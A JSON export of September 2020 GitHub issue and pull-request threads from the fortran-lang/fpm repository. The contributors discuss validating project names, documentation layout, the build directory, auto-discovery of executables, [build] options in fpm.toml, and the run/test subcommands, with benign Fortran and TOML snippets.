{
    "name": "fortran-lang/fpm",
    "issues": [
        {
            "number": 196,
            "user": "urbanjost",
            "date": "2020-09-27 20:55:39+00:00",
            "title": "not all directory names are valid project names",
            "text": "Currently the \"new\" subcommand is given a name that is also suitable as a module name and a project name. Should that be the case?  More and more systems support Unicode names for directories and so on.  As a simple example if you enter\nsomething like\nfpm new 1\nfpm new project.1\nyou can see the problem",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-27 21:19:06+00:00",
                    "text": "This is one of many things I didn't consider to be necessary to deal with in the prototype, but we should absolutely tackle in the Fortran version. There are essentially 2 ways to handle this specific problem:\n\nReject names that are not valid Fortran identifiers and issue an error message to the user without doing anything\nFor anywhere that the name appears as an identifier in the code, convert invalid symbols to _, but still need to reject the name and issue an error message if the first character is not an ASCII letter\n\nI would prefer option 1 as it is more concise and simple, but if there is sufficient support for 2 I think it would be acceptable."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-27 23:10:37+00:00",
                    "text": "I happen to have an example for the VERIFY(3f) intrinsic\nprogram demo_verify\nimplicit none\ncharacter(len=64)  :: line\ninteger            :: ios\n   do\n      read(*,'(a)',iostat=ios) line\n      if(ios.ne.0) exit\n      if( fortran_name(line) )then\n         write(*,*)trim(line),' passed'\n      else\n         write(*,*)trim(line),' failed'\n      endif\n   enddo\ncontains\nfunction fortran_name(line) result (lout)\n! determine if a string is a valid Fortran name ignoring trailing spaces (but not leading spaces)\ncharacter(len=*),parameter   :: int='0123456789'\ncharacter(len=*),parameter   :: lower='abcdefghijklmnopqrstuvwxyz'\ncharacter(len=*),parameter   :: upper='ABCDEFGHIJKLMNOPQRSTUVWXYZ'\ncharacter(len=*),parameter   :: allowed=upper//lower//int//'_'\ncharacter(len=*),intent(in)  :: line\ncharacter(len=:),allocatable :: name\nlogical                      :: lout\n   name=trim(line)\n   if(len(name).ne.0)then\n      lout = .true.                                  &\n       & .and. verify(name(1:1), lower//upper) == 0  &\n       & .and. verify(name,allowed) == 0             &\n       & .and. len(name) <= 63\n   else\n      lout = .false.\n   endif\nend function fortran_name\nend program demo_verify\nThat I could put in put in fpm_strings.f90 if the preference is 1) , Not sure why I have the redundant \".true.\" in there, but I would take that out."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-28 10:50:26+00:00",
                    "text": "I would support method 1) as the way to handle this problem.\nThere is actually already a fortran name validation function buried in fpm_sources.f90:\n\n  \n    \n      fpm/fpm/src/fpm_sources.f90\n    \n    \n        Lines 405 to 439\n      in\n      90ddc6f\n    \n    \n    \n    \n\n        \n          \n           function validate_name(name) result(valid) \n        \n\n        \n          \n               character(*), intent(in) :: name \n        \n\n        \n          \n               logical :: valid \n        \n\n        \n          \n            \n        \n\n        \n          \n               integer :: i \n        \n\n        \n          \n            \n        \n\n        \n          \n               if (len_trim(name) < 1) then \n        \n\n        \n          \n                   valid = .false. \n        \n\n        \n          \n                   return \n        \n\n        \n          \n               end if \n        \n\n        \n          \n            \n        \n\n        \n          \n               if (lower(name(1:1)) < 'a' .or. & \n        \n\n        \n          \n                   lower(name(1:1)) > 'z') then \n        \n\n        \n          \n            \n        \n\n        \n          \n                   valid = .false. \n        \n\n        \n          \n                   return \n        \n\n        \n          \n               end if \n        \n\n        \n          \n            \n        \n\n        \n          \n               do i=1,len(name) \n        \n\n        \n          \n            \n        \n\n        \n          \n                   if (.not.( & \n        \n\n        \n          \n                       (name(i:i) >= '0' .and. name(i:i) <= '9').or. & \n        \n\n        \n          \n                       (lower(name(i:i)) >= 'a' .and. lower(name(i:i)) <= 'z').or. & \n        \n\n        \n          \n                       name(i:i) == '_') ) then \n        \n\n        \n          \n                            \n        \n\n        \n          \n                       valid = .false. \n        \n\n        \n          \n                       return \n        \n\n        \n          \n                   end if \n        \n\n        \n          \n            \n        \n\n        \n          \n               end do \n        \n\n        \n          \n            \n        \n\n        \n          \n               valid = .true. \n        \n\n        \n          \n               return \n        \n\n        \n          \n            \n        \n\n        \n          \n           end function validate_name \n        \n    \n  \n\n\nThough this implementation is not as elegant as yours @urbanjost, so would support replacing it with yours if/when you put it in fpm_strings.f90."
                },
                {
                    "user": "certik",
                    "date": "2020-09-28 15:26:00+00:00",
                    "text": "I would reject names that are not valid Fortran program names.\nLater, we can relax this restriction in various ways if there is demand."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-29 01:41:18+00:00",
                    "text": "IThanks; but right now I want to change as few files as possible until things catch up. I was just going to put your routine into the strings library as it is actually likely faster and mine was just a demo I made for someone to show them how VERIFY could be used, which is not intuitively obvious to a lot of peope, apparently. So I just used mine directly in the fpm_command_line.f90 file for now If the NEW PR gets accepted I will move one to the fpm_strings.f90 so we can both use it if no one beats me to it, but I would like to see master updated first and then that can just be a simple stand-alone PR that should be easily reviewable/merged. I have too many little changes in NEW already, I think. Hoping this is acceptable and  can be merged. Please review and let me know what needs changed!"
                }
            ]
        },
        {
            "number": 195,
            "user": "urbanjost",
            "date": "2020-09-27 20:43:31+00:00",
            "title": "should the default layout include a recommended structure for a doc/ directory?",
            "text": "I have not seen much definition of it but I have seen several references to a --install option for fpm(1). I assume that at a minimum that will copy executables and object and *.mod files to user-specified areas and perhaps a \"standard\" area for fpm(1) packages.  If that is the case it would be typical to install at least some kinds of documenation. On Linux systems that often is the /usr/share area.  So should some recommendation or creation of an area like doc/ be created and or man/ or html/?  Github has specific preferences for the name and content type of documentation, but of course it is only one of many forums. If there is no rules specified for what an --install will do with documention I am afraid it will be \"left behind\" when an install occurs. That also applies to dependencies. Currently if I use a number of remote dependencies in a project I have to manually look through the build directory to see if there is any documentation supplied with the package.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-09-28 15:46:51+00:00",
                    "text": "I think it's a good idea to standardize something for documentation. Cargo for example automatically generates documentation for a Cargo package.\nDown the road once we have a documentation generator, we can simply use it, like Cargo does.\nWe can also standardize where to put linux man pages if there is interest."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-28 20:03:00+00:00",
                    "text": "Manpages are one issue, they can either be in roff already or be in some format, like asciidoc, which has to be translated with the correct tool first. fpm should know what a manpage is and how it must be placed on install ($PREFIX/share/man/man<id>). On default fpm could search for a man directory and attempt to translate any adoc file using asciidoctor and than install all roff files, both generated and found. Maybe supporting a section like this in the fpm.toml\n[documentation]\n[documentation.manpages]\ninclude = \"man\"\ntool = \"asciidoctor\"\ncompress = true  # compress with gz\nHTML documentation might be generated with ford, doxygen, ..., there are a lot of tools out there, not sure if there is a way to easily support them in a generic way or to detect them. It should not be shipped by default, since it can be rather large."
                },
                {
                    "user": "certik",
                    "date": "2020-09-29 16:45:45+00:00",
                    "text": "Distribution in general (even of asciidoctor) will be an issue. We will figure it out eventually, either by creating fpm packages for those, or once fpm can interface Conda and other package managers, it can install those via them. Until then, we can at least experiment with designs, perhaps even optionally using asciidoctor and other tools if they are present, and skipping the doc build if they are not present."
                }
            ]
        },
        {
            "number": 194,
            "user": "urbanjost",
            "date": "2020-09-27 20:33:58+00:00",
            "title": "Should the build/ directory be a hidden directory?",
            "text": "If a goal of fpm(1) is that the user should not have to interact directly with anything in the build directory I would prefer it be a hidden directory like \".git\" for git(1) users. But I see other package managers use the build/ directory more like a scratch area\nthat contains things like log files from a build or test that users are expected to interact with. So I would alter my preference\nif that is the case. So my suggestion to change build/ to ./build hinges on things like\n\nshould there be a build/log file and should the \"build\" and \"test\" commands always write their output there?\nis the intent that a user need not and should not know anything about the structure of the build/ directory?\n\nin a related vein I think it should be explicitly stated in the documentation that everything fpm(1) creates is in the build directory and that it can be freely deleted and recreated with a subsequent build command assuming that remote dependencies are available. When I first installed fpm(1) it was not clear to me whether I could or should alter the build directory.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-27 21:04:23+00:00",
                    "text": "I'm not opposed to making the build directory hidden. I believe Haskell's Stack does that. It certainly makes it clearer that users aren't intended to be looking in there. But if we start putting log files in there, users wouldn't necessarily find them. (Maybe that would be intentional though?)\nI agree that we should make it clear that it is safe to delete the build directory in the documentation, but also that users shouldn't modify anything in there. We've listed it in .gitignore for new projects, but that doesn't necessarily make it clear to everybody."
                }
            ]
        },
        {
            "number": 193,
            "user": "LKedward",
            "date": "2020-09-27 12:19:52+00:00",
            "title": "Local path dependencies",
            "text": "NB. This PR includes commits from #190.\nPlease see here for the unique changes in this PR while #190 is open.\n\n\nAdds support for local path dependencies\n\n\nFortran fpm can now build the hello_fpm, circular_test and circular_example example packages\n\n\nI will keep as draft while #190 is open.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-09-28 15:23:49+00:00",
                    "text": "This looks great.  Thanks!\nLet's finish #190 soon, so that we can build upon it."
                }
            ]
        },
        {
            "number": 192,
            "user": "urbanjost",
            "date": "2020-09-26 16:38:13+00:00",
            "title": "Should files created by \"fpm new\" only be placeholders or more substantive?",
            "text": "When you run \"fpm new\" it creates placeholder files. They are essentially \"hello world\" examples. That keeps it simple but I was wondering if a more substantive file might be useful, especially for programmers new to Fortran or unit testing. Maybe a link to the stdlib logging/testing topics in a WRITE statement, ...\nBut thinking of something like the following:\nprogram main\nimplicit none\ninteger                    :: A = 10,  B = 20,  C = 30,  i\nlogical,allocatable        :: tally(:)\nlogical                    :: allpassed = .true.\ncharacter(len=*),parameter :: gen = \"(*(g0:, 1x))\"\ncharacter(len=*),parameter :: fancy = \"(a, *(\"\"[\"\"g0,\"\":\"\",g0,\"\"]\"\":))\"\n   write(*,\"(a)\")\"SAMPLE TEST PROGRAM - Put some real tests in here!\"\n   ! determine if a group of tests all pass\n   allpassed = allpassed .and. a < b .and. b < c\n   allpassed = allpassed .and. annotate( \"IS A.LT.B?\", a < b )\n   allpassed = allpassed .and. annotate( \"IS B.LT.C?\", b < c )\n   allpassed = allpassed .and. annotate( \"IS A.LT.C?\", a < c )\n   write(*,\"(a)\")merge(\"EVERYTHING PASSED\",\"SOMETHING FAILED \",allpassed)\n   ! append results of tests into TALLY\n   tally = [ logical :: ]\n   tally = [ tally, a < b ]\n   tally = [ tally, c < b ]\n   tally = [ tally, b < c .and. a < c ]\n   ! show test results\n   write(*, fmt=fancy)\"testing tally=\", (i, tally(i), i = 1, size(tally))\n   if( all(tally) )then\n      write(*, gen)\"PASSED: all\", size(tally), \"tests passed\"\n   else\n      write(*, gen)\"FAILED: out of\", size(tally), \"tests\",   &\n       & count(.not.tally), \"failed and\", count(tally), \"passed\"\n   endif\ncontains\n   function annotate(msg, tst)\n   character(len=*),intent(in) :: msg\n   logical,intent(in)          :: tst\n   logical                     :: annotate\n      annotate=tst\n      write(*, \"(a,1x,l1)\" )msg,tst\n   end function annotate\nend program main\nJust throwing the thought out there.  Maybe the README.md file could have something in it too, like:\nThis project uses the Fortran Package Manager\nThe home page for fpm(1) is\nhttp://github.com/fortran-lang/fpm\nRegistered fpm(1) packages can be found at\nhttp://fortran-lang.org/packages/\nDiscuss Fortran at\nhttps://fortran-lang.discourse.group/latest\nContribute to the Fortran Standard Library at\nhttps://github.com/fortran-lang/stdlib\nFind this and more at the Fortran Language page\nBut markdown is not exactly portable, so not sure links would always work and user might not even be usiing a web repository",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-09-26 17:13:49+00:00",
                    "text": "I like the idea of a more elaborate README. Advertising resources for Fortran might be interesting, maybe more helpful would be a short introduction on fpm, from building over running tests to finally installing the project, if it is well written, it might stay in the README of the finally published project as building instructions.\nAs for the scaffold of the executable or library, the less the better, chances that an example code will fit the users project are rather small, in my opinion.\nBut I can see, that giving fpm the capability to work as a cookiecutter for creating a new project, when giving the correct template, could reduce some repetitive work. Maybe we could allow fpm to create a new project from a template repository."
                }
            ]
        },
        {
            "number": 191,
            "user": "awvwgk",
            "date": "2020-09-26 12:58:17+00:00",
            "title": "Package options in fpm.toml",
            "text": "Came up in #190 and disabling/enabling the auto discovery features.\nGenerally, we need a way to customize fpm per package, as a first suggestion for the auto discovery:\n[build]  # or config, ...\nauto-executables = true\nauto-tests = false\nThe fpm-options could include other information as well, like\n[build]\nfast-math = false  # don't use -ffast-math\nstandard = \"2008\"\npreprocessor = \"fypp\"\nThere are two major questions here\n\nWhich table should hold options to customize fpm per package?\n\nmanifest root, [build], [config], ...\n\n\nWhich options do want to include in this section?\n\nauto-discovery, standard, preprocessor, compiler flags, ...",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-09-26 17:05:57+00:00",
                    "text": "I prefer [build] over [config] as the table name since it's more descriptive. We could also include an option to turn-on link-time optimization (LTO). I'm not sure about preprocessor as a global option - I'd assumed that we'd be able to determine if a source needs a particular  preprocessor based on file extension? This would allow both fypp and cpp to be used in the same project.\nFor compiler/linker flags it would be useful to have two options for either appending to or overriding built-in flags, e.g.:\nfflags-extra       # Append to fortran compiler flags\nfflags             # Override fortran compiler flags\ncflags               \ncflags-extra\nlflags\nlflags-extra"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-26 18:59:40+00:00",
                    "text": "I'd assumed that we'd be able to determine if a source needs a particular preprocessor based on file extension?\n\nThe relevant issue should be #78 for this discussion. The conclusion seems to be that supporting both is necessary. I think fypp and cpp should be mutually exclusive on per project basis, since both would probably use .F90 as file extension. We could search for .fypp macro files, but a project can use fypp without defining those.\nI think, we have yet to establish a best practise on preprocessor usage with fpm."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-27 20:47:21+00:00",
                    "text": "I think this will almost certainly be necessary, and I like [build] as the table. I think each option/entry in the table will need it's own discussion, but one thing I think each will need to answer is: How are the precedence or combinations of options handled during the building of dependencies?\nAs an example (and I'm certain there will be others for which the answer may be different), if a package specifies fast-math = false, but it has a dependency that specifies fast-math = true, is that dependency built with or without fast math? Presumably that dependency isn't doing anything for which fast math would cause issues, and it would still be safe to compile it with fast math, and compile the main package without. But then what about the reverse scenario? Is that still safe?\nBut we should probably just save those discussions for each specific option."
                },
                {
                    "user": "certik",
                    "date": "2020-09-28 15:14:52+00:00",
                    "text": "Depending on what exactly ends up in [build], the other option to use is [package] or [fpm]. I think [build] is fine for stuff like compiler options or fast-math. For auto discovery my first inclination was to use a section [fpm]. But [build] is fine with me also, so let's go with that.\nI think fast-math is tricky, I think one approach is:\n\n\nthere is a flag that specifies if a given package works with fast math. We can discuss if this flag should be on by default, the safe is off by default. This flag can be called fast-math. This is the only flag that you specify in fpm.toml.\n\n\nWhen the user uses fpm to build an app, it can specify options on the command line such as fast-math. By default this fast-math option can be on. If this option is on, fpm will check all dependencies, and if they all have their fast-math flag on, it will build everything with fast-math. If even one of them has this flag off, it will build everything with fast-math off. This is the safest approach that will work.\n\n\nMore advanced approach is to mix and match fast-math in dependencies, and my experience is that it doesn't always work, because fast-math enables various CPU hardware options (such as disabling denormal numbers) which screws things up for code that does not work with fast-math. As such, I would recommend the safe approach above."
                }
            ]
        },
        {
            "number": 190,
            "user": "LKedward",
            "date": "2020-09-26 10:43:53+00:00",
            "title": "Auto discovery of executables",
            "text": "Set of changes to address #164 as discussed there.\n\n\nRemoves filtering out of executables/tests not specified in the manifest; this allows all programs found in app/ and test/ directories (and subdirectories) into the package model.\n\n\nDoes not affect existing behaviour of [[executable]] and [[test]] entries in manifest:\n\nCan still specify non-default layouts with these entries;\nCan override individual settings for auto-discovered executables.\n\n\n\nAdds a 'scope' to each source, based on source file location, to control which modules can be used within:\n\nLibrary modules (from src/) can only use other library modules or modules from dependencies;\nPrograms and modules in app/ and test/ can use library modules and any modules defined in the same directory as the executable/test;\nLibrary modules cannot use modules in app/ or test/;\nModule dependency resolution fails fatally if a source file cannot be found for a use statement that satisfies these scoping rules.\n\n\n\nAdds a new example demonstrating:\n\nAutomatic discovery of programs/tests;\nOverriding of a discovered executable name in manifest;\nModules in same directory as apps and tests.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-09-26 12:12:36+00:00",
                    "text": "This looks like a useful addition, therefore apologies for the next question: How do you turn it off?\nCargo can disable those by: https://doc.rust-lang.org/cargo/reference/cargo-targets.html#target-auto-discovery"
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-26 12:25:17+00:00",
                    "text": "How do you turn it off?\n\nFair question. I haven't implemented a way to disable it yet but agree that it is needed.\nWhat manifest syntax would you suggest? Would you prefer this to be included in this PR or a separate one?"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-26 12:44:11+00:00",
                    "text": "What manifest syntax would you suggest?\n\nIn Cargo it is top-level (meaning [package] which is top-level in fpm).\nBut maybe a separate section in the fpm.toml is preferable:\n[build]  # or config, ...\nauto-tests = false\nauto-executables = false\nNaming would be important, since this is going to be the section holding all the build configuration rules later, I guess.\n\nWould you prefer this to be included in this PR or a separate one?\n\nThe syntax will need a bit of discussion first, might be worth deferring than.\nEdit: Let's discuss this in a separate issue: #191"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-28 03:20:57+00:00",
                    "text": "]So if you have multiple test programs that all shared a module either in the test directory or specified by [test.dependencies]\nthat you did not need to be used by anything but the test programs (a common case for me where I have a module essentially just used for unit tests)?  It sounds like I would not have to put the programs in seperate subdirectories and that I could put everything directly in test?  If I wanted to have each test in a subdirectory would I have to have the test module in each subdirectory as well?  I am being lazy in that I could look at the code but I am not positive in the discussions whether the term \"directory\" is being used to mean the top directories app/, test/ and src/ or the subdirectories currently required in h-fpm for each executable."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-28 08:34:32+00:00",
                    "text": "@urbanjost, yes your understanding is correct: in this PR you no longer need separate subdirectories in app/ or test/ for multiple executables and tests and you no longer need to specify each test and executable in fpm.toml. You can still use subdirectories but as you point out you can't share modules easily between executables in different subdirectories, so in this case I would recommend using [test.dependencies] instead."
                },
                {
                    "user": "certik",
                    "date": "2020-09-28 15:16:40+00:00",
                    "text": "This looks awesome. Why don't you implement the following:\n[build]\nauto-tests = false\nauto-executables = false\n\nAnd add a test for it.\nThen this PR will be ready to merge. In the meantime, we will come up with some way to move forward in #191, and if we end up with different names, it's easy to rename in this PR."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-29 12:53:09+00:00",
                    "text": "Thanks for the explanation @awvwgk, that makes sense. Changes applied."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-29 13:04:24+00:00",
                    "text": "Nice work on the batch commit for suggested changes. Sorry for pointing out now that the build_config doesn't have to be allocatable anymore."
                }
            ]
        },
        {
            "number": 189,
            "user": "urbanjost",
            "date": "2020-09-24 06:37:48+00:00",
            "title": "Pull request for NEW",
            "text": "sort out branches\nadd test program for CLI\nfix fpm.toml version reference\nremove --usage references from help text\nbasic RUN subcommand\nremove dash from executable name to see if it clears MSWindows build error\ntry one more like previous build to clear error\nbuild on proposed CLI interface to make a \"new\" and \"run\" subcommand for discussion\nbasic new,test,run added to build subcommands\nchange quoting of -- ARGS values for more platform independence and change test accordingly\nreplace cli_test test\nconsistent indenting",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-09-28 15:21:19+00:00",
                    "text": "There is some failure on Windows. Otherwise this looks good."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-29 01:15:39+00:00",
                    "text": "All tests pass now. I have built, run, and tested 17 packages built with h-fpm with this version of f-fpm. I think the changes to the fpm_command_line.f90 are self-contained and straight-forward to review, and well as the \"new\" subcommand. I just utilized the existing functionality in \"build\" to implement \"run\" and \"test\".  The --list extension, the alternate --lib --test --app for --with-executable and --with-test and whether they should replace the --with-* options and what the default should be for \"fpm new\" and the new routine to find default test files are the main parts I am looking for affirmation on. The build/search/dependency is great and I am trying some Fortran/C projects that required fpm.mk files look like they will work with the new code; quite significant compared to what I hope are relatively minor changes I am proposing here. I look forward to everyone's review. Everyone has come a long way towards making a package that can just require gfortran and git and maybe ar and libcurl or OS-specific equivalents for ar.  Although the main focus here is to make a package manager I am starting to get excited that this can also be used on a stand-alone system for a new Fortran programmer. It would be nice for a novice to not have to learn Make/CMake/... and ar and what switches to use on a compiler for debugging and production before they can gt very far with Fortran; and still be useable by someone that does know those things. Lots of things to resolve but I am getting excited that the day I want to make a program with command-line cracking, date and time functions, regular expressions, ... and a plethora of mathematical functions could be trivial. Historically Fortran programmers don't play well together. I have seen a lot of activity lately that shows this is changing and fpm(1) and stdlib really does seem like they could be the missing pieces that finally change this (only took sixty years)."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-29 14:29:08+00:00",
                    "text": "Thanks a lot, @urbanjost, I will play with it today."
                },
                {
                    "user": "certik",
                    "date": "2020-09-29 16:41:50+00:00",
                    "text": "Can you please use 4 spaces to be consistent? Or 2 if you must, but based on our survey, almost nobody prefers 3 spaces."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-30 00:32:40+00:00",
                    "text": "Interesting. The most common indent I see I and I have many millions of lines of code is three; and quite a few auto-formatters defaulted to three last I looked.  I did not see many votes on that so I think the sample size was too small. In general even python which uses indenting to control logic flow does not care about indenting except that it is there or is not. I liked the conclusion I that that came to that code could be run through a specific auto-indenter but have not seen that emerge. Changing the indenting would cause a lot of changes just based on white-space which other arguments here say is undesirable so I am torn here. If I run the whole thing through findent(1) for example it triggers a lot of changes here. I thought there were options in git to ignore white-space differences but must be mistaken. I was going to suggest that be turned on but I guess that was a false memory. Has there been any progress on an automatic reformatter?  I saw the discussion on LFortran possibly doing that. Since I assume that would be based on a fully parsed source that could be much more flexible than most typical reformatters that usually work on a line-by-line basis with some basic split/join capacity."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-30 02:05:32+00:00",
                    "text": "Instead of dealing with the white-space issues piece-meal I ran the fpm.f90 and fpm_command_line.f90 files through a formatter for a one-time\n(hopefully) pass to get it consistent, as there have been multiple authors and styles used in these files. The other changes were applied except for resolving if there is a benefit or standard for use of the STOP statement. In a prototype there are pros and cons to what a STOP statement does."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-30 13:39:49+00:00",
                    "text": "My opinion on the stop and error stop statements is that error stop should be reserved for things that would be indicative of a programming/logic bug. I.e. in the case default of a select case block. These bugs would then (hopefully) be found in development and testing, and the stack trace could be useful.\nFor any other errors the procedure should not stop the program. It should return the error to the caller in some way. Exactly how and in what form, and how sophisticated that is can be open for discussion, but it should probably be done consistently throughout the project.\nThis is so we can unit test such procedures. They're expected to encounter these errors (or you wouldn't have written the code to check for them in the first place) and therefore should be tested to handle those errors properly.\nThere are basically two designs one could use for this:\n\nany procedure that does error handling has an intent(out) argument for returning any error(s) or (for functions) the return type is one that can contain the error(s)\nany procedure that does error handling has an intent(in) argument of class(error_handler_t) with error handling TBPs that can be \"mocked\" in tests to prevent the unit tests from actually stopping and ensure that the appropriate error handling procedure was in fact called.\n\nI generally prefer option 1, as all my procedures can then be pure, but it does have the drawback of sometimes leading to \"noisy\" code as one must always explicitly check the return value for errors."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-30 13:44:58+00:00",
                    "text": "Also FYI, from the standard:\n\nAccording to this document, the following are processor dependent:\n...\nwhether the processor supports a concept of process exit status, and if so, the process exit status on program\ntermination (5.3.7)\n\nSo there is no \"standard\" way of specifying the exit status of a program, and thus one should not rely on it. Obviously a tool like fpm should endeavor to provide a meaningful exit status, but our code and tests shouldn't rely on it."
                }
            ]
        },
        {
            "number": 188,
            "user": "urbanjost",
            "date": "2020-09-23 02:42:50+00:00",
            "title": "implement basic run subcommand in Fortran fpm",
            "text": "Looking at the subcommand \"build\" and just following that as a model I think I can make a functioning \"run\" subcommand for the Fortran fpm if the CLI is in place. I would like to give that a try, as I do not see that listed anywhere. If that works I believe the \"test\" subcommand would b virtually identical except it would use the test names instead of the executable names.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-23 14:23:28+00:00",
                    "text": "That would be great. One quick note about a subtle difference between run and test, run should call build to make sure everything is up to date, which does not necessarily need to fetch or build the dev-dependencies or the tests. However, test does need to make sure that build does do that first. I think so far we are missing the --test switch for the build command that would signify this behavior for that command."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-26 16:16:24+00:00",
                    "text": "I new build was being called from run and test, but in the version so far I have left build as-is for the most part so for now the run and test commands just have a placeholder. The build in the version I was expanding upon seems to unconditionally when called. The build of course is the core,  but I was not trying to tackle that till the CLI/new/run/test commands were in place. To match what is in the Haskell fpm it needs to do quite a bit more and is doing a few things that might be intentional or might not be. The *.o files are built with the original file prefix intact -- if name.f90 is built name.f90.o is output; but I have seen this done intentionally to avoid collisions between Fortran and C files of the same basename; the Haskell version builds seperate programs in seperate directories but this one puts everything in the app directory. Not sure if that is an intentional refactoring or needs expanded and so on. So I had too many questions about that and skipped calling it automatically. Considering what you say here I should at least call it if the executable does not exist; so it would be created if not updated. I will make that change and as soon as \"build\" is complete at least for files local to the project directory I think it will be a one-line change to call it unconditionally."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-26 16:51:04+00:00",
                    "text": "Your proposed solution to call build when the app/test doesn't exist seems reasonable until conditional compilation is implemented in build. Matching Haskell fpm behaviour with respect to object files doesn't seem to be a necessary goal."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-27 00:55:39+00:00",
                    "text": "Changed the PR to call build if executable does not exist with a command that that is temporary. I had made an earlier model that emulated the Haskell version partly because that then gave me existing packages to test against and a pass/fail criteria that it generated the same files.  But the build routine has been expanded since then, and when I call it in some of the existing Haskell fpm packages it fails, but I am not sure if that is intentional or not. Everything goes into app/ and test/ instead of specific directories that mirror the input file path name for example. But I see several other discussions about redoing how files are automatically discovered and how the build/ directory might be restructured and it is not clear to me as to what should be changed so\n\nshould the Fortran fpm be compatible with the Haskell fpm in that it can build any current H-fpm package\nshould the generated files all go into the directories they are currently placed in?\nSo the problem is that as-is a bunch of current fpm packages I have to not build. The gfortran command being built could probably be changed to correct for where the files ARE going, or the files can be re-arranged to go where they do in the Haskell version, which would also change the gfortran command.  It is essentially unclear which way the community plans on this going so I think I am stuck at this point until/if the CLI interface is merged and then the same for this one, and I am not sure when/if that is happening.  So is there a functional spec anywhere that says what F-fpm will do? I wanted to look at whether a topological sort of the build files is reasonable to do in fortran to get the right compile order or if that is already in the current build and I missed it ( I haven't gotten through understanding all of it yet). So I think I am basically frozen at this point (waiting for Gadot).  This will create the same files H-fpm does for the \"new\" command and \"build\", \"run\", and \"test\" it robustly which I was hoping would be merged so the bigger issue of complex builds could be resolved. That would create a functional F-fpm for local projects and only leave the lib-curl  part remaining and non-Fortran.  So you would have to have gfortran and git and probably ar or its equivalent but you could build projects on a relatively normal system (and git isn't really needed to do the development) without having to install Haskell.  I was hoping we would be at that point and refining fpm to be a useful tool for building local projects; and then when the project sharing was enabled that would be the show-stopper. The toml-f package was a huge step forward, and now things seem stalled on simpler issues I thought I could get out of the way. Seems like I am missing something but Fortran needs an easy module sharing mechanism and other package managers have not seemed to catch on with the Fortran community in my experience. Seems like a project plan is missing."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-27 07:19:16+00:00",
                    "text": "Thanks for your comments @urbanjost, you raise some good points.\nRegarding the object file paths, I have no objection to matching the behaviour of Haskell fpm; but since I see little benefit to this, beyond allowing side-by-side use of h-fpm and fpm, it isn't something I will be personally addressing soon. Your 'test' for matching object file output between fpm and h-fpm seems quite arbitrary since no promises have been made about the structure of intermediate build files. Am I missing something here? Is there an important reason why you want the intermediate objects to match the Haskell version beyond your test between the two versions?\nFortran fpm can build any H-fpm package that doesn't have any external dependencies or build system - if you have a self-contained package that builds with h-fpm but not with fortran fpm please let me know! If you haven't already, please also see this index of example packages that I put together that summarises the current feature gap between fpm and h-fpm.\nRegarding the topo sort, this is already implemented within the build system via a depth-first search; there are improvements that can be made to this, in particular to enable parallel builds, but this isn't a high priority IMO."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-27 17:54:39+00:00",
                    "text": "In my opinion, no promises about intermediate build files or locations should be made. Even the locations of desired artifacts (e.g. library files or executables) should probably be left unspecified other than where an install command would put them. Ideally, user's should not need to know or rely on such details. Of course Hyrum's Law will almost certainly come into effect pretty quickly, so we should probably at least put some thought into it."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-27 18:19:12+00:00",
                    "text": "There were several comments that supported the goal of making the f-fpm version at first duplicate h-fpm and nothing I could find that clearly stated otherwise so for lack of a better goal I was trying to get it to duplicate the h-fpm version so that I could interchangeably use either h-fpm and f-fpm in the same directory, but that was primarily useful for testing the build functionality that at the time did not exist. Now that I had some time to look I see build is essentially done except for not rebuilding and what you mentioned. Nice job. So I have a bunch that fail but a quick look shows it is probably the same reason. See the trivial build\n   M_msg          = { git = \"https://github.com/urbanjost/M_msg.git\" }\n\nwhich shows a setup that works with h-fpm and not f-fpm.  After I removed the packages with external dependencies and the ones with custom make files and ones with system dependencies like X11, ncurses that uses an extension in a private version it worked very well on 17 non-trival projects which was quite exciting. In those I could (using PR #189) do  build, build -release, run --list,  test --list, run NAME, test NAME, and your build method worked with the files made with a new command as well, so for local builds it looks great. Several packages only have a custom makefile because they include C code which your version seems to support so I am going to try that. But if f-fpm should be able to build anything h-fpm does if you could take a look at the M_msg module which is the smallest example hitting the problem that would be great.\nIs supporting two languages why the .f90 suffix is left on the relocatable files? Seems to work fine but unexpected; and there was no libNAME.a files which I was not sure if was intentional but as long as using the *.o files works about the only side-effect is a slightly bigger executable.  I have seen leaving the suffix on as a way to avoid conflicts in projects that have NAME.c and NAME.f90 sources going into a single lib.a file but it is rare (actually it was me and I have seen it no where else :>)."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-27 19:49:22+00:00",
